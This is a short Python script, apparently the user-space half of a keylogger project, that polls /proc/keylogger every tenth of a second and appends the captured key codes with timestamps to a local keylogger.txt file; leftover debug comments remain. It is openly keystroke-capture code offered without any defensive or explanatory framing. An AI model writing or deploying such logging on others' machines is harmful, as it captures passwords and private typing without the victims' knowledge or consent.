import time

while True:
    # print("loop di loop")
    with open("/proc/keylogger") as f:
        key_history = list(map(int, f.readline().split()))

    # print("procy docky")

    with open("./keylogger.txt", 'a') as f:
        for key in key_history:
            f.write(str(time.time()) + ": " + str(key) + "\n")

    time.sleep(0.1)
